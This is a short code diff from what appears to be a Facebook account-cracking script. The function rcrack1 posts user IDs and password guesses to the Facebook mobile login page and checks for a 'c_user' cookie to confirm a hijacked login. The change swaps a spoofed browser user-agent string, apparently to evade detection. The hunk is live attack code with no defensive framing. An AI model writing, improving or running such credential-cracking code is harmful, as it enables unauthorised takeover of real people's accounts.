@@ -256,7 +256,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A530F/A530FXXS8CSL2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Android 7.0; Mobile; rv:57.0) Gecko/57.0 Firefox/57.0 WhiteHat Security',}
             lo = session.post('https://p.facebook.com/login/?li=nigVZLNWTZ3wDwKBvqdp5NLE&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
